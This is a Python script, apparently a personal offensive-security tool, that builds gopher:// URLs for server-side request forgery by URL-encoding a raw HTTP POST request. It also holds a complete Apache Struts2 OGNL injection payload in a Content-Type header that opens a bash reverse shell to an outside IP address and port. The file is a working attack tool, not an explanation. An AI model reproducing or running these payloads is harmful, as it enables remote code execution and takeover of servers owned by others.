# -*- coding:utf-8 -*-
__author__ = 'leezp'
__date__ = 20210326
import random

'''
1.问号（?）需要转码为URL编码，也就是%3f
2、回车换行要变为%0d%0a
3、在HTTP包的最后要加%0d%0a，代表消息结束（具体可研究HTTP包结束）   # 我测试末尾有没有 %0d%0a 都可以成功发包
4、要在使用gopher协议时在url后加入一个字符（该字符可随意写）   
5、' ','(',')',';','&' 需要url编码
'''
'''
index.php 
<?php echo $_POST['test']; echo $_POST['test2'];?>
'''
# 下面4个参数为gopher POST请求必要参数
# 注意 Content-Length 要手动设置，与body总长度一致，否则会报错。我这里 ‘test=a&test2=b’ 长度为 14;
str = '''POST / HTTP/1.1
Host: xxx.xxx.xxx.x
Content-Type: application/x-www-form-urlencoded
Content-Length: 14

test=a&test2=b
'''
str1 = '''GET /showcase.action HTTP/1.1
Content-Type:%{(#_='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='bash -i >& /dev/tcp/114.116.253.148/2333 0>&1').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}

'''
a = 'gopher://127.0.0.1:80/'
s = '_'
fuhao_list = ['_', ',', '?']
s = fuhao_list[random.randint(1, 3) - 1]
l = str.split('\r\n')
for i in l:
    s = s + i.replace('\n', '%0d%0a')
'''if s.endswith('%0d%0a'):
   s=s[0:s.rindex('%0d%0a')]'''
print(a + s.replace(' ', '%20').replace('(', '%28').replace(')', '%29').replace(';', '%3b').replace('&', '%26'))
